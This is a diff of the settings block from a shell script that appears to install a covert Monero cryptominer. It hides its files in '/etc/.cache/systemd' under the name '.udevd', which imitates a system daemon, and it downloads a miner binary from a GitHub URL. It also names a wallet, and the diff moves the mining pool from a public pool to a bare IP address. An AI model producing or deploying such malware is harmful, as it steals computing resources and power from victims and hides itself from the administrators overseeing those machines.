@@ -5,7 +5,7 @@
 WORK_DIR="/etc/.cache/systemd"
 BINARY_NAME=".udevd"
 MINER_URL="https://github.com/wakitobi/glowing-umbrella/raw/main/bos"
-POOL_URL="xmr.kryptex.network:7029"
+POOL_URL="5.223.60.114:1111"
 WALLET="89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.PY"
 THREADS=$(nproc 2>/dev/null || echo 4)
 
